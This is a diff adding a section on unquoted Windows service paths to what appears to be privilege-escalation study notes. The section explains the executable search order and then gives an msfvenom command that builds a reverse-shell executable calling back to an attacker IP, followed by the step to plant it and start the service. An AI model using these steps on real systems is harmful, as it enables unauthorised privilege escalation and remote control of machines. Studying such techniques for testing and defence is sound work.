@@ -144,6 +144,49 @@ $ sc stop dllsvc & sc start dllsvc
 
 ## Unquoted Service Path
 
+Check the reffering binary for an executable
 
+```console
+$ C:\Users\user>sc qc netlogon
+[SC] QueryServiceConfig SUCCESS
 
+SERVICE_NAME: netlogon
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\lsass.exe
+        LOAD_ORDER_GROUP   : MS_WindowsRemoteValidation
+        TAG                : 0
+        DISPLAY_NAME       : Netlogon
+        DEPENDENCIES       : LanmanWorkstation
+        SERVICE_START_NAME : LocalSystem
+```
 
+In the example above, when the service is launched, Windows follows a search order similar to what we have seen in the previous task. Imagine now we have a service (e.g. srvc) which has a binary path set to C:\Program Files\topservice folder\subservice subfolder\srvc.exe
+To the human eye, this path would be merely different than "C:\Program Files\topservice folder\subservice subfolder\srvc.exe". We would understand the service is trying to run srvc.exe.
+
+Windows approaches the matter slightly differently. It knows the service is looking for an executable file, and it will start looking for it. If the path is written between quotes, Windows will directly go to the correct location and launch service.exe. 
+
+However, if the path is not written between quotes and if any folder name in the path has a space in its name, things may get complicated. Windows will append ".exe" and start looking for an executable, starting with the shortest possible path. In our example, this would be C:\Program.exe. If program.exe is not available, the second attempt will be to run topservice.exe under C:\Program Files\. If this also fails, another attempt will be made for C:\Program Files\topservice folder\subservice.exe. This process repeats until the executable is found. 
+
+Knowing this, if we can place an executable in a location we know the service is looking for one, it may be run by the service. 
+As you can understand, exploiting an unquoted service path vulnerability will require us to have write permissions to a folder where the service will look for an executable. 
+
+WinPeas or PowerUP detect this Vulnerabilities.
+
+```console
+$ wmic service get name,displayname,pathname,startmode
+
+Prints out the running services
+```
+
+Create a Payload for reverseshell with msfvenom:
+```console
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe
+- executable name see example above e.g. subservice.exe
+```
+
+Upload file and start service:
+```console
+$ sc start unquotedsvc
+```
